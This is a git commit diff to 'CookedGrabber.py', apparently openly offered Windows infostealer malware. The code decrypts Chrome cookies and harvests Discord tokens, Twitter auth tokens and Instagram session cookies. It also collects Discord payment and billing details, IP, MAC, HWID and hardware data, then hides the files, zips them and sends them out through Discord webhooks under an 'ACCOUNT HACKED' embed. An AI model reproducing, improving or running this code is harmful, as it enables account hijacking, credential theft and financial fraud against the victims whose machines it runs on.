1a75197a867d36b143e48dd83ef49c096c2175c9
mouadessalim <38190847+mouadessalim@users.noreply.github.com>
2022-08-05 02:30:08 +0100

    New frontend for DiscordWebhook and cookies
    - Adding multicompatibilities for instagram
    - New frontend for discord webhook and cookies.

--- CookedGrabber.py
+++ CookedGrabber.py
@@ -1,5 +1,5 @@
-import json
-import os, io
+from multiprocessing.sharedctypes import Value
+import os
 import sys
 from json import loads
 from base64 import b64decode
@@ -8,16 +8,23 @@ from shutil import copyfile
 from threading import Thread 
 from win32crypt import CryptUnprotectData
 from Crypto.Cipher import AES
-from discord_webhook import DiscordWebhook
+from discord_webhook import DiscordEmbed, DiscordWebhook
 from subprocess import Popen, PIPE
 from urllib.request import urlopen, Request
 from requests import get
 from re import findall, search
 import win32con
-from win32api import SetFileAttributes
+from win32api import SetFileAttributes, GetSystemMetrics
 import browser_cookie3
 from browser_history import get_history
 from prettytable import PrettyTable
+from platform import platform
+from getmac import get_mac_address as gma
+from pycountry import countries
+from cpuinfo import get_cpu_info
+from psutil import virtual_memory
+from collections import defaultdict
+from zipfile import ZipFile, ZIP_DEFLATED
 
 website = ['discord.com', 'twitter.com', 'instagram.com']
 
@@ -54,9 +61,6 @@ def cookies_grabber_mod(u):
     return cookies
 
 def get_Personal_data():
-    hwid = get_hwid()
-    pc_username = os.getenv('UserName')
-    pc_name = os.getenv('COMPUTERNAME')
     try:
         ip_address=urlopen(Request('https://api64.ipify.org')).read().decode().strip()
         country=urlopen(Request(f'https://ipapi.co/{ip_address}/country_name')).read().decode().strip()
@@ -65,7 +69,7 @@ def get_Personal_data():
         city="City not found -_-"
         country="Country not found -_-"
         ip_address="No IP found -_-"
-    return f"**PC name:** `{pc_name}`\n**Pc username:** `{pc_username}`\n**Ip Adress:** `{ip_address}`\n**Country:** `{country}`\n**City:** `{city}`\n**HWID:** `{hwid}`"
+    return [ip_address, country, city]
 
 def find_His():
     table = PrettyTable(padding_width=1)
@@ -102,7 +106,6 @@ def get_encryption_key():
     with open(local_state_path, "r", encoding="utf-8") as f:
         local_state = f.read()
         local_state = loads(local_state)
-
     key = b64decode(local_state["os_crypt"]["encrypted_key"])
     key = key[5:]
     return CryptUnprotectData(key, None, None, None, 0)[1]
@@ -118,17 +121,16 @@ def decrypt_data(data, key):
             return str(CryptUnprotectData(data, None, None, None, 0)[1])
         except:
             return ""
+
 def main():
     filename = "Cookies.db"
     db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                             "Google", "Chrome", "User Data", "Default", "Network", "Cookies")
-
     if not os.path.isfile(filename):
         copyfile(db_path, filename)
         SetFileAttributes(filename, win32con.FILE_ATTRIBUTE_HIDDEN)
     db = connect(filename)
     db.text_factory = lambda b: b.decode(errors="ignore")
-    cursor = db.cursor()
     result = []
     for w in website:
         if w == 'discord.com':
@@ -160,74 +162,36 @@ def main():
             for t in threads:
                 t.start()
                 t.join()
-            final_tokens = ''
-            for n in tokens:
-                final_tokens += f"- {n}\n"
-            result.append(f"""=====================================================\nDISCORD INFO:\n\nHost: {w}\nCookie name: TOKEN\nCookie value [discord token(s)]:\n\n{final_tokens}=====================================================""")
         elif w == 'twitter.com':
-            t_cookies = []
+            t_cookies, t_lst = ([] for _ in range(2))
             for b in cookies_grabber_mod('twitter.com'):
                 t_cookies.append(b.split(', '))
-            t_lst = []
             for c in t_cookies:
                 for y in c:
                     if search(r"auth_token", y) != None:
-                        dt = y.split(' ')[1].split("=")[1]
-                        if dt not in t_lst:
-                            t_lst.append(dt)
-            if len(t_lst) != 0:
-                result.append(f"""TWITTER INFO:\n\nHost: twitter.com\nCookie name: auth_token\nCookie value [twitter authentification key]: {t_lst}\n=====================================================""")
+                        t_lst.append(y.split(' ')[1].split("=")[1])
         elif w == 'instagram.com':
-            instaLst = []
-            cursor.execute(f"""
-            SELECT host_key, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value 
-            FROM cookies WHERE host_key like '%{w}%'""")
-            key = get_encryption_key()
-            for host_key, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value in cursor.fetchall():
-                if not value:
-                    decrypted_value = decrypt_data(encrypted_value, key)
-                else:
-                    decrypted_value = value
-                instaLst.append({'domain': f"{host_key}", "name": f"{name}", "value": f"{decrypted_value}"})
-            if len(instaLst) != 0:    
-                result.append(f"INSTAGRAM INFO:\n\n{json.dumps(instaLst, indent=4)}\n=====================================================\n")
-            else:
-                insta_cookies = []
-                for b in cookies_grabber_mod('instagram.com'):
-                    insta_cookies.append(b.split(', '))
-                insta_lst = []
-                insta_dupl = []
-                for c in insta_cookies:
+            insta_cookies, insta_lst = ([] for _ in range(2))
+            for b in cookies_grabber_mod('instagram.com'):
+                insta_cookies.append(b.split(', '))
+            browser_ = defaultdict(dict)
+            for c in insta_cookies:
+                if all([search(r"ds_user_id", str(c))!=None, search(r"sessionid", str(c))!=None, search(r"csrftoken", str(c))!=None]):
                     for y in c:
-                        if search(r"ds_user_id", y) != None:
-                            dt = y.split(' ')[1].split("=")[1]
-                            if dt not in insta_dupl:  
-                                insta_dupl.append(dt)                          
-                                insta_lst.append(c)
-                if len(insta_lst) != 0:
-                    insta_formated = 'INSTAGRAM ALL COOKIES FOUNDED:\n\n'
-                    for h in insta_lst:
-                        insta_formated += f"{h}\n"
-                    result.append(insta_formated)
-    try:
-        cursor.execute("""
-        UPDATE cookies SET value = ?, has_expires = 1, expires_utc = 99999999999999999, is_persistent = 1, is_secure = 0
-        WHERE host_key = ?
-        AND name = ?""", (decrypted_value, host_key, name))
-    except:
-        pass
-    data = ''
-    for r in result:
-        data += f"{r}\n"
-    all_data, all_data_p, lst, lst_b = [], [], '', ''
+                        conditions = [search(r"ds_user_id", y)!=None, search(r"sessionid", y)!=None, search(r"csrftoken", y)!=None]
+                        if any(conditions):
+                            browser_[insta_cookies.index(c)][conditions.index(True)] = y.split(' ')[1].split("=")[1]
+            for x in list(dict(browser_).keys()):
+                insta_lst.append(list(dict(browser_)[x].items()))
+            for x in insta_lst:
+                for y in x:
+                    if x.index(y) != y[0]:
+                        x[x.index(y)], x[y[0]] = x[y[0]], x[x.index(y)]
+            for x in insta_lst:
+                for y in x:
+                    x[x.index(y)] = y[1]
+    all_data_p, lst_b = ([] for _ in range(2))
     for x in tokens:
-        try:
-            lst = get_user_data(x)
-            username, email, phone = f"{lst[0]}#{lst[1]}", lst[2], lst[3]
-            if [username, email, phone] not in all_data:
-                all_data.append([username, email, phone]) 
-        except:
-            pass
         lst_b = has_payment_methods(x)
         try:
             for n in range(len(lst_b)):
@@ -241,37 +205,90 @@ def main():
                         all_data_p.append(writable_2)
         except:
             pass
-    data += "DISCORD ACCOUNT INFO FOUNDED:\n\n"
-    for g in all_data:
-        data += f"""\nPseudo: {all_data[all_data.index(g)][0]}\nDiscord email: {all_data[all_data.index(g)][1]}\nDiscord phone num: {all_data[all_data.index(g)][2]}
-        \n====================================================="""
-    def discord_info_w(x, y):
-        data += f"""Billings Adress:\n{all_data_p[x][y]['name']}\n{all_data_p[x][y]['line_1']}\n{all_data_p[x][y]['line_2']}
-        \nCity and state: {all_data_p[x][y]['city']} - {all_data_p[x][y]['state']}\nCountry: {all_data_p[x][y]['country']}\nPostal Code: {all_data_p[x][y]['postal_code']}
-        \n=====================================================\n"""
-    data += "\nDISCORD PAYMENT INFO FOUNDED:\n"
-    for b in all_data_p:
-        m = all_data_p.index(b)
-        if all_data_p[m][1] == 1:
-            data += f"Provider: {all_data_p[m][0]}\nLast_4: {all_data_p[m][2]}\nExpire: {all_data_p[m][3]}/{all_data_p[m][4]}\n-------------------------------\n"
-            discord_info_w(m, 5)
-        elif all_data_p[m][1] == 2:
-            data += f"Email (Paypal) {all_data_p[m][0]}\n-------------------------------\n"
-            discord_info_w(m, 2)
     db.commit()
     db.close()
     try:
         os.remove('Cookies.db')
     except:
         pass
-    return data
+    return [tokens, list(set(t_lst)), list(set(tuple(element) for element in insta_lst)), all_data_p]
+
+def replace_new(path):
+    if os.path.exists(path):
+        os.remove(path)
 
 def send_webhook(DISCORD_WEBHOOK_URLs):
+    p_lst = get_Personal_data()
+    cpuinfo = get_cpu_info()
+    main_info = main()
+    discord_T, twitter_T, insta_T = (PrettyTable(padding_width=1) for _ in range(3))
+    discord_T.field_names, twitter_T.field_names, insta_T.field_names, verified_tokens = ["Discord Tokens", "Username", "Email", "Phone"], ["Twitter Tokens [auth_token]"], ["ds_user_id", "sessionid", "csrftoken"], []
+    for t_ in main_info[0]:
+        try:
+            lst = get_user_data(t_)
+            username, email, phone = f"{lst[0]}#{lst[1]}", lst[2], lst[3]
+            discord_T.add_row([t_, username, email, phone])
+            verified_tokens.append(t_)
+        except:
+            pass
+    for _t in main_info[1]:
+        twitter_T.add_row([_t])
+    for _t_ in main_info[2]:
+        insta_T.add_row(_t_)
+    pay_l = []
+    for _p in main_info[3]:
+        if _p[1] == 1:
+            payment_card = PrettyTable(padding_width=1)
+            payment_card.field_names = ["Brand", "Type","Last 4", "Expiration", "Billing Adress"]
+            payment_card.add_row([_p[0], _p[2], "Debit or Credit Card", f"{_p[3]}/{_p[4]}", _p[5]])
+            pay_l.append(payment_card.get_string())
+        elif _p[1] == 2:
+            payment_p = PrettyTable(padding_width=1)
+            payment_p.field_names = ["Email", "Type", "Billing Adress"]
+            payment_p.add_row([_p[0], "Paypal", _p[2]])
+            pay_l.append(payment_p.get_string())
+    files_names = [["Discord Tokens.txt", "discord_T"], ["Twitter Token.txt", "twitter_T"], ["Instagram Token.txt", "insta_T"]]
+    for x_, y_ in files_names:
+        if (y_ == files_names[0][1] and len(main_info[0])!=0) or (y_ == files_names[1][1] and len(main_info[1])!=0) or (y_ == files_names[2][1] and len(main_info[2])!=0):
+            replace_new(x_)
+            with open(x_, 'w') as wr:
+                SetFileAttributes(x_, win32con.FILE_ATTRIBUTE_HIDDEN)
+                wr.write(eval(f"{y_}.get_string()"))
+    replace_new("data.zip")
+    with ZipFile("data.zip", mode='w', compression=ZIP_DEFLATED) as zip:
+        SetFileAttributes("data.zip", win32con.FILE_ATTRIBUTE_HIDDEN)
+        if payment_card or payment_p:
+            replace_new("Payment Info.txt")
+            with open("Payment Info.txt", 'w') as f:
+                SetFileAttributes("Payment Info.txt", win32con.FILE_ATTRIBUTE_HIDDEN)
+                for i in pay_l:
+                    f.write(f"{i}\n")
+            zip.write("Payment Info.txt")
+            os.remove("Payment Info.txt")
+        for name_f, _ in files_names:
+            if os.path.exists(name_f):
+                zip.write(name_f)
+                os.remove(name_f)
     for URL in DISCORD_WEBHOOK_URLs:
-        webhook = DiscordWebhook(url=URL, content=get_Personal_data(), username='H4XOR', avatar_url="https://images-ext-1.discordapp.net/external/0b5bkDNyeu-6aaEBkJECuydS2b0hIFcnnSNuvhlUjbM/https/i.pinimg.com/736x/42/d2/f5/42d2f541c7e6437272b01920b97a7282.jpg")
-        webhook.add_file(file=main(), filename='data.txt')
-        webhook.add_file(file=find_His(), filename='user_history.txt')
+        webhook = DiscordWebhook(url=URL, username='H4XOR', avatar_url="https://images-ext-1.discordapp.net/external/0b5bkDNyeu-6aaEBkJECuydS2b0hIFcnnSNuvhlUjbM/https/i.pinimg.com/736x/42/d2/f5/42d2f541c7e6437272b01920b97a7282.jpg")
+        embed = DiscordEmbed(title='Cooked Grabber', color='00FF00')
+        embed.add_embed_field(name='SYSTEM USER INFO', value=f":pushpin:`PC Username:` **{os.getenv('UserName')}**\n:computer:`PC Name:` **{os.getenv('COMPUTERNAME')}**\n:globe_with_meridians:`OS:` **{platform()}**\n", inline=False)
+        embed.add_embed_field(name='IP USER INFO', value=f":eyes:`IP:` **{p_lst[0]}**\n:golf:`Country:` **{p_lst[1]}** :flag_{countries.get(name=p_lst[1]).alpha_2.lower()}:\n:cityscape:`City:` **{p_lst[2]}**\n:shield:`MAC:` **{gma()}**\n:wrench:`HWID:` **{get_hwid().strip()}**\n", inline=False)
+        embed.add_embed_field(name='PC USER COMPONENT', value=f":satellite_orbital:`CPU:` **{cpuinfo['brand_raw']} - {cpuinfo['hz_advertised_friendly']}**\n:nut_and_bolt:`RAM:` **{round(virtual_memory().total / (1024.0 ** 3), 2)} GB**\n:desktop:`Resolution:` **{GetSystemMetrics(0)}x{GetSystemMetrics(1)}**\n", inline=False)
+        embed.add_embed_field(name='ACCOUNT HACKED', value=f":red_circle:`Discord:` **{len(verified_tokens)}**\n:purple_circle:`Twitter:` **{len(main_info[1])}**\n:blue_circle:`Instagram:` **{len(main_info[2])}**\n", inline=False)
+        card_e, paypal_e = ":white_check_mark:" if 'payment_card' in locals() else ":x:", ":white_check_mark:" if 'payment_p' in locals() else ":x:"
+        embed.add_embed_field(name='PAYMENT INFO FOUNDED', value=f":credit_card:`Debit or Credit Card:` {card_e}\n:money_with_wings:`Paypal:` {paypal_e}", inline=False)
+        embed.set_author(
+            name="H4X0R-TEAM",
+            url="https://github.com/h4x0r-project"
+        )
+        embed.set_footer(text='By Lemon.-_-.#3714 & cr4sh3d.py#2160')
+        embed.set_timestamp()
+        with open("data.zip", 'rb') as f:
+            webhook.add_file(file=f.read(), filename=f"Cooked-Grabber-{os.getenv('UserName')}.zip")
+        webhook.add_embed(embed)
         webhook.execute()
+    os.remove("data.zip")
 
 if __name__ == "__main__":
     if len(sys.argv) == 1:
